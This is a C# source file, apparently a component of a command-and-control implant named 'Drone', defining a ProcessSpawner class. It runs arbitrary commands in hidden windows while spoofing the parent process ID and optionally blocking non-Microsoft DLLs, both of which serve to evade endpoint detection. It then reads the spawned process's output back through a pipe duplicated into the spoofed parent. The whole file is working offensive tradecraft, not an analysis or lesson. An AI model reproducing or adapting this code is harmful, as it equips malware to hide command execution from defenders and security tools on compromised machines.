using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

using Microsoft.Win32.SafeHandles;

namespace Drone.Utilities;

public class ProcessSpawner
{
    private readonly bool _blockDlls;
    private int _parentPid;

    public ProcessSpawner(int parentPid, bool blockDlls)
    {
        _parentPid = parentPid;
        _blockDlls = blockDlls;
    }

    public string SpawnAndReadProcess(string command)
    {
        var hAttributes = new Win32.SECURITY_ATTRIBUTES();
        hAttributes.nLength = Marshal.SizeOf(hAttributes);
        hAttributes.bInheritHandle = true;
        hAttributes.lpSecurityDescriptor = IntPtr.Zero;

        var hStdOutRead = IntPtr.Zero;
        var hStdOutWrite = IntPtr.Zero;
        var hDupStdOutWrite = IntPtr.Zero;

        if (!Win32.CreatePipe(out hStdOutRead, out hStdOutWrite, ref hAttributes, 0))
            throw new Win32Exception(Marshal.GetLastWin32Error());
        
        Win32.SetHandleInformation(hStdOutRead, Win32.HANDLE_FLAGS.INHERIT, 0);

        var pi = new Win32.PROCESS_INFORMATION();
        var si = new Win32.STARTUPINFOEX();

        si.StartupInfo.dwFlags = Win32.STARTF_USESHOWWINDOW | Win32.STARTF_USESTDHANDLES;
        si.StartupInfo.wShowWindow = Win32.SW_HIDE;
        si.StartupInfo.cb = (uint)Marshal.SizeOf(si);

        var dwAttributeList = 1;

        if (_blockDlls)
            dwAttributeList += 1;

        // no parent, use ourself
        if (_parentPid == -1)
        {
            using var self = Process.GetCurrentProcess();
            _parentPid = self.Id;
        }

        var lpValueProc = IntPtr.Zero;

        try
        {
            var lpSize = IntPtr.Zero;
            Win32.InitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeList, ref lpSize);
            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);

            if (!Win32.InitializeProcThreadAttributeList(si.lpAttributeList, dwAttributeList, ref lpSize))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            if (_blockDlls)
            {
                var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteInt64(lpMitigationPolicy, Win32.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

                if (!Win32.UpdateProcThreadAttribute(
                        si.lpAttributeList,
                        (IntPtr)Win32.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        lpMitigationPolicy,
                        (IntPtr)IntPtr.Size))
                    throw new Win32Exception(Marshal.GetLastWin32Error());
            }

            var hParent = Native.NtOpenProcess(
                (uint)_parentPid,
                (uint)(Win32.PROCESS_ACCESS_FLAGS.PROCESS_CREATE_PROCESS |
                       Win32.PROCESS_ACCESS_FLAGS.PROCESS_DUP_HANDLE));

            if (hParent == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValueProc, hParent);

            if (!Win32.UpdateProcThreadAttribute(
                    si.lpAttributeList,
                    (IntPtr)Win32.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValueProc,
                    (IntPtr)IntPtr.Size))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            using var current = Process.GetCurrentProcess();
            if (!Win32.DuplicateHandle(
                    current.Handle,
                    hStdOutWrite,
                    hParent,
                    ref hDupStdOutWrite,
                    0,
                    true,
                    Win32.DUPLICATE_CLOSE_SOURCE | Win32.DUPLICATE_SAME_ACCESS))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            si.StartupInfo.hStdError = hDupStdOutWrite;
            si.StartupInfo.hStdOutput = hDupStdOutWrite;

            var pa = new Win32.SECURITY_ATTRIBUTES();
            //pa.nLength = Marshal.SizeOf(pa);

            var ta = new Win32.SECURITY_ATTRIBUTES();
            //ta.nLength = Marshal.SizeOf(ta);

            if (!Win32.CreateProcess(
                    null,
                    command,
                    ref pa,
                    ref ta,
                    true,
                    Win32.PROCESS_CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT |
                    Win32.PROCESS_CREATION_FLAGS.CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    Directory.GetCurrentDirectory(),
                    ref si,
                    out pi))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            var hFile = new SafeFileHandle(hStdOutRead, false);
            var fs = new FileStream(hFile, FileAccess.Read, 1024, false);
            var sr = new StreamReader(fs, Console.OutputEncoding, true);

            var result = string.Empty;
            var processExited = false;

            try
            {
                do
                {
                    if (Win32.WaitForSingleObject(pi.hProcess, 100) == 0)
                        processExited = true;

                    uint bytesToRead = 0;
                    var peeked = Win32.PeekNamedPipe(hStdOutRead, ref bytesToRead);

                    if (peeked && bytesToRead == 0)
                    {
                        if (processExited)
                            break;

                        continue;
                    }

                    // only read 1024 max
                    if (bytesToRead > 1024)
                        bytesToRead = 1024;

                    var buf = new char[bytesToRead];
                    var bytesRead = sr.Read(buf, 0, buf.Length);

                    if (bytesRead > 0)
                        result += new string(buf);

                } while (true);

                sr.Dispose();
            }
            finally
            {
                if (!hFile.IsClosed)
                    hFile.Close();
            }

            if (hStdOutRead != IntPtr.Zero)
                Win32.CloseHandle(hStdOutRead);

            return result;
        }
        finally
        {
            if (si.lpAttributeList != IntPtr.Zero)
            {
                Win32.DeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
            }

            Marshal.FreeHGlobal(lpValueProc);

            if (pi.hProcess != IntPtr.Zero)
                Win32.CloseHandle(pi.hProcess);

            if (pi.hThread != IntPtr.Zero)
                Win32.CloseHandle(pi.hThread);
        }
    }
}